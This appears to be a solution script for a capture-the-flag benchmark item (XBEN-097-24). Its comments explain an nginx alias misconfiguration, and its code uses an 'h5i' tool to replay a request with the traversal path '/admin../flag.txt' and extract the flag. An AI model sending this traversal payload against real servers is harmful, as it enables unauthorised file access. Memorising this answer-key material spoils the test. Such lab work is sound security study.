#!/usr/bin/env bash
# XBEN-097-24 — "XB APP 2" (tags: path_traversal)
#
# The nginx config has both of these:
#
#     location /admin/ { alias /var/www/html/admin/; }
#     location /admin  { alias /var/www/html/; autoindex on; }
#
# The second has no trailing slash on the location but a trailing slash on the
# alias, which is the classic misconfiguration: nginx strips the matched prefix
# and appends the rest, so `/admin../flag.txt` becomes
# `/var/www/html/../flag.txt`. The `..` never appears in a path segment of its
# own, so nothing normalises it away, and `autoindex on` even lists the parent
# directory for you.
#
# This is a *server* bug, not an application one: no PHP is involved and there
# is no parameter to inject into.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben097-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create --set 'path=/admin../flag.txt' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
